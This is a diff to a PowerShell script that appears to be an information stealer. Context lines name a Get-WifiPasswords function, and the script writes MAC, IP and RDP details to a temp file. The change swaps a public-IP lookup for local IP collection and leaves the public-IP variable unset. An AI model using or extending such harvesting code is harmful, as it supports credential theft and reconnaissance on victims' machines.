@@ -103,12 +103,16 @@ function Get-WifiPasswords {
 
 # Get info about pc
 
-# Get IP / Network Info
+# Retrieve local IP addresses using Get-CimInstance
 try {
-    # Retrieve public IP address
-    $computerPubIP = (Invoke-RestMethod -Uri "https://api.ipify.org").Content
+    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
+    if ($computerIPs) {
+        $localIP = $computerIPs -join ", "
+    } else {
+        $localIP = "No IP addresses found"
+    }
 } catch {
-    $computerPubIP = "Error getting Public IP"
+    $localIP = "Error getting local IP addresses"
 }
 
 # Retrieve local IP addresses using Get-CimInstance
@@ -344,7 +348,7 @@ Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$File
 "Network: 
 ==================================================================
 Computers MAC address: " + $MAC >> $env:TMP\$FileName
-"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
+"Local IP address(es): $localIP" >> $env:TMP\$FileName
 "Public IP address: " + $computerPubIP >> $env:TMP\$FileName
 "RDP: " + $RDP >> $env:TMP\$FileName
 "" >> $env:TMP\$FileName
